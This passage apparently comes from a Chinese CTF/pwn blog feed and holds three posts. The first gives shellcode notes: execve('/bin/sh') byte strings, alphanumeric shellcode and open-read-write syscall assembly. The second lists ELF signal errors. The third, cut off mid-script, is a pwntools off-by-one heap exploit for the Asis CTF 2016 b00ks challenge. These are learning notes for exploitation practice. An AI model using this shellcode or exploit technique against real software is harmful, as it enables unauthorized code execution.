0x23333333</code>，所以直接把<code>rop</code>或<code>shellcode</code>布置在<code>64</code>位的地址上就会在<code>push</code>与<code>pop</code>等操作时出问题，故需要先将<code>rop</code>或<code>shellcode</code>写入<code>bss</code>段等短地址区域上，在切换跳转后，也要注意平衡栈帧。</p><h3 id="ret-n"><a href="#ret-n" class="headerlink" title="ret $n"></a>ret $n</h3><p>在搜索gagdet时,经常会遇到ret 后面接一个立即数的例如<code>ret 0x5069</code></p><p>之前一直认为这是返回到0x5069的意思</p><p>但其实这相当于<code>pop ip;sp+=n</code></p><p>常用的ret实际上就相当于是<code>ret 0</code>即<code>pop ip;sp+=0</code></p><h2 id="高位清空机制"><a href="#高位清空机制" class="headerlink" title="高位清空机制"></a>高位清空机制</h2><p>intel规定,对通用寄存器低32位操作会导致高32位清零，对低16位、8位操作则对高位无影响</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x888  ;会导致rax高32位清零</span><br><span class="line">mov ax,0x88    ;不会导致rax高32位清零</span><br><span class="line">mov al,0x8     ;不导致rax高32位清零</span><br></pre></td></tr></table></figure><h2 id="c内联汇编-asm"><a href="#c内联汇编-asm" class="headerlink" title="c内联汇编_asm_"></a>c内联汇编_<em>asm_</em></h2><p>在c语言中可以使用_<em>asm_</em>标识符来声明一段汇编代码</p><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__ (</span><br><span class="line">    <span class="string">&quot;pop %rdi\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %rsi\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %rdx\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %rax, 1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>不过其使用的是AT&amp;T语法,还要注意每一句的结尾需要换行</p><h1 id="shellcode相关"><a href="#shellcode相关" class="headerlink" title="shellcode相关"></a>shellcode相关</h1><h2 id="shellcode-getshell"><a href="#shellcode-getshell" class="headerlink" title="shellcode(getshell)"></a>shellcode(getshell)</h2><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><p><strong>22字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05</span><br></pre></td></tr></table></figure><p>需要确保rax高位本来就是0</p><p><strong>23字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure><p><strong>53字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x48\x89\xE7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x5E\x48\x01\xE6\x56\x48\x89\xE6\x31\xD2\xFF\x34\x25\x00\x00\x00\x00\x58\x0F\x05</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><p><strong>18字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x0B\x58\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>21字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure><p><strong>48字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xC9\x51\x6A\x04\x59\x01\xE1\x51\x89\xE1\x31\xD2\xFF\x35\x00\x00\x00\x00\x58\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></pre></td></tr></table></figure><h2 id="shellcode-orw"><a href="#shellcode-orw" class="headerlink" title="shellcode(orw)"></a>shellcode(orw)</h2><h3 id="i386-1"><a href="#i386-1" class="headerlink" title="i386"></a>i386</h3><p>采用int 0x80系统中断达到系统调用</p><p>eax存放系统调用号并在调用结束存储返回值,ebx,ecx,edx,esi,edi依次为参数,与函数调用约定存放在栈中不同</p><h4 id="open-返回文件流序号fd"><a href="#open-返回文件流序号fd" class="headerlink" title="open(返回文件流序号fd)"></a>open(返回文件流序号fd)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">push ecx    ;文件名结束&#x27;\x00&#x27;</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov ebx,esp ;文件名在栈中</span><br><span class="line">xor edx,edx ;int mode</span><br><span class="line">mov eax,5   ;sys_open</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax   ;上一步返回的fd存储在eax</span><br><span class="line">mov ecx,esp   ;写在何处,一般直接在栈上,也可以在别处</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,3     ;sys_read</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,1     ;mov ebx,2也行</span><br><span class="line">/*0标准输入,1标准输出,2标准错误*/</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,4     ;sys_write</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="amd64-1"><a href="#amd64-1" class="headerlink" title="amd64"></a>amd64</h3><p>与i386大同小异</p><p>采用syscall系统调用</p><p>rax存放系统调用号并在调用结束存储返回值,rdi,rsi,rdx,rcx,r8,r9依次为参数,与函数调用约定一致</p><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx   ;文件名结束&#x27;\x00&#x27;,也可以添加在文件名其实</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,2   ;直接mov rax,2要更长</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov dl,0x??</span><br><span class="line">mov al,0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line">mov edi,1</span><br><span class="line">mov al,1;</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="纯可见字符shellcode"><a href="#纯可见字符shellcode" class="headerlink" title="纯可见字符shellcode"></a>纯可见字符shellcode</h2><p>相关资料</p><p><a href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode</a></p><p><a href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">x86纯字符编码表</a></p><p><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">x64纯字符编码表</a></p><h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>其是一个python2的脚本</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h4><p>先生成shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line">print asm(sc)</span><br></pre></td></tr></table></figure><p>保存到aplha3目录下</p><p><code>python2 sc.py &gt; payload</code></p><p>生成纯可见字符alpha shellcode</p><p><code>python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;payload&quot;</code></p><p><strong>参数分析:</strong></p><ul><li>x64  选择位数[可选x86]</li><li>ascii mixedcase 选择字符表[可选ascii uppercase (数字+大写字母)   ascii lowercase (数字+小写字母)   ascii mixedcase (数字+大小写字母)]</li><li>rax 用于编码的寄存器(shellcode基址)  见下引例</li><li>—input=’’  输入文件</li></ul><p>比如有如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00101246 48 8d     LEA    RAX,[RBP + -0x410]</span><br><span class="line">         85 f0 </span><br><span class="line">         fb ff </span><br><span class="line">0010124d ff d0     CALL   RAX</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure><p>通过call rax跳转到shellcode，那么alpha3命令中<strong>用于编码的寄存器就是rax</strong></p><p><strong>shellcode的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个</strong></p><hr><p><strong>alpha3支持的所有编码方式如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Valid base address examples for each encoder, ordered by encoder settings,</span><br><span class="line">are:</span><br><span class="line"></span><br><span class="line">[x64 ascii mixedcase]</span><br><span class="line">  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI</span><br><span class="line"></span><br><span class="line">[x86 ascii lowercase]</span><br><span class="line">  AscLow 0x30 (rm32)        ECX EDX EBX</span><br><span class="line"></span><br><span class="line">[x86 ascii mixedcase]</span><br><span class="line">  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]</span><br><span class="line">                            ECX+2 ESI+4 ESI+8</span><br><span class="line">  AscMix 0x30 (i32)         (address)</span><br><span class="line">  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty</span><br><span class="line">                            countslide:EBX+offset~uncertainty</span><br><span class="line">                            countslide:ECX+offset~uncertainty</span><br><span class="line">                            countslide:EDX+offset~uncertainty</span><br><span class="line">                            countslide:ESI+offset~uncertainty</span><br><span class="line">                            countslide:EDI+offset~uncertainty</span><br><span class="line">  AscMix Countslide (i32)   countslide:address~uncertainty</span><br><span class="line">  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3</span><br><span class="line"></span><br><span class="line">[x86 ascii uppercase]</span><br><span class="line">  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br><span class="line"></span><br><span class="line">[x86 latin-1 mixedcase]</span><br><span class="line">  Latin1Mix CALL GetPC      call</span><br><span class="line"></span><br><span class="line">[x86 utf-16 uppercase]</span><br><span class="line">  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br></pre></td></tr></table></figure><h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p><a href="https://github.com/veritas501/ae64">AE64</a>是杭电的一位大师傅写的python3脚本工具，专用于生成64位的aplha shellcode。</p><p>AE64的优势在于编码时可以更加灵活地使用寄存器，但是生成的alpha shellcode比alpha3要更长一些。</p><p>此外AE64是python写的，可以直接在python中调用，以下是官方的栗子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./example1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;r13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcraft使用"><a href="#shellcraft使用" class="headerlink" title="shellcraft使用"></a>shellcraft使用</h2><p>pwntools自带的shell生成模块,生成的汇编代码能达到目的,但一般长度较大</p><p>shellcraft.sh()</p><p>shellcraft.read()</p><p>shellcraft.write()</p><p>shellcraft.open()</p><p> 寄存器记得加引号</p><h2 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h2><p>清零</p><p>syscall</p><p>int 0x80</p><p>参数布置</p><p>等等</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>elf常见运行报错</title>
      <link href="/posts/43614/"/>
      <url>/posts/43614/</url>
      
        <content type="html"><![CDATA[<h1 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h1><p><strong>signal: 11</strong></p><p><strong>exit code: 139</strong></p><p><strong>信号名: SIGSEGV</strong></p><p>最常见的一类错误了</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>访问不存在的内存地址</strong></li><li><strong>访问系统保护的内存地址</strong></li><li><strong>对内存地址进行不符合该内存地址权限的操作</strong>,例如读不可读的地址,写不可写的地址,执行不可执行的地址</li><li><strong>内存对齐问题</strong>,经常会遇到类似这样的汇编命令<code>movaps xmmword ptr [r64 + 0x??], xmm0</code>,操作涉及到xmm寄存器,属于SIMD指令,其中movaps会检查[r64 + 0x??]地址<strong>是否16字节对齐</strong>,不对齐则异常,抛出段错误.</li></ol><h1 id="Bus-error"><a href="#Bus-error" class="headerlink" title="Bus error"></a>Bus error</h1><p><strong>signal: 7</strong></p><p><strong>exit code: 135</strong></p><p><strong>信号名: SIGBUS</strong></p><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><h3 id="文件映射访问异常"><a href="#文件映射访问异常" class="headerlink" title="文件映射访问异常"></a>文件映射访问异常</h3><p>这是 SIGBUS 在用户态最为常见最容易触发的情况，通常来说根本原因都是进程 mmap 了一个文件后，另外的进程把这个文件截断了，导致 mmap 出来的某些内存页超出文件的实际大小，访问那些超出的内存页就会触发 SIGBUS，具体来说有以下几种场景：</p><ol><li><p>进程 mmap 一个文件后，其它进程 truncate 该文件到更小。</p></li><li><p>动态库更新，直接 cp 覆盖。</p></li><li><p>可执行文件更新，直接 cp 覆盖。</p></li></ol><p>系统读取磁盘文件通常是按页映射到内存，出于效率考虑常常使用 copy on write 机制，所以文件映射之后，如果对应的文件 page 不存在了(truncated），也不见得会马上出问题，只有到访问时才会出错，因此有一定滞后期。</p><h3 id="访问不对齐的内存"><a href="#访问不对齐的内存" class="headerlink" title="访问不对齐的内存"></a>访问不对齐的内存</h3><p>X86 平台上访问不对齐的内存时，默认不会有问题，但用户可以手动设置 EFLAGS 把 CPU 设置为不允许非对齐的内存访问，此时如果出现不对齐的内存访问，SIGBUS 就会抛出。</p><h1 id="错误的系统调用"><a href="#错误的系统调用" class="headerlink" title="错误的系统调用"></a>错误的系统调用</h1><p><strong>signal: 31</strong></p><p><strong>exit code: 159</strong></p><p><strong>信号名: SIGSYS</strong></p><p><strong>常见在开启了seccomp的程序中,当进行了被限制的系统调用时,抛出该错误</strong></p><h1 id="定时器信号"><a href="#定时器信号" class="headerlink" title="定时器信号"></a>定时器信号</h1><p><strong>signal: 14</strong></p><p><strong>exit code: 1</strong>4</p><p><strong>信号名: SIGALRM</strong></p><p><strong>长时间未响应程序时抛出该信号</strong></p><h1 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h1><p><strong>signal: 6</strong></p><p><strong>exit code: 134</strong></p><p><strong>信号名: SIGABRT</strong></p><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><ol><li><strong>执行abort函数</strong></li><li>执行assert函数</li><li><strong>double free or corruption (!prev)</strong>,其实就是堆操作错误了,归根结底最后还是由<strong>abort函数触发</strong></li></ol><h1 id="信号表"><a href="#信号表" class="headerlink" title="信号表"></a>信号表</h1><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-05-14_165734.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆实操学习笔记</title>
      <link href="/posts/15815/"/>
      <url>/posts/15815/</url>
      
        <content type="html"><![CDATA[<h1 id="题录"><a href="#题录" class="headerlink" title="题录"></a>题录</h1><h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h2><p><strong>难度:★★</strong></p><p><strong>核心利用是off-by-one</strong></p><p>使得一个用于管理指针的chunk指向可写区域,进而达到任意写的目的</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):  <span class="comment">#print功能会打印所有book的信息,需要挑选</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#使得在打印book1地址前不会停下</span></span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)<span class="comment">#这个大小还有一些限制,这样的话刚刚好,否则可能会要填充一些padding</span></span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)<span class="comment">#mem指针指向&#x27;/bin/sh&#x27;指针,free时用到</span></span><br><span class="line"><span class="comment">#gdb.attach(io)  </span></span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">payload1 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x30</span>) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#第二个pack是为了得到mmap地址</span></span><br><span class="line"><span class="comment">#第三个pack是为了使得des1指向的位置不变</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span 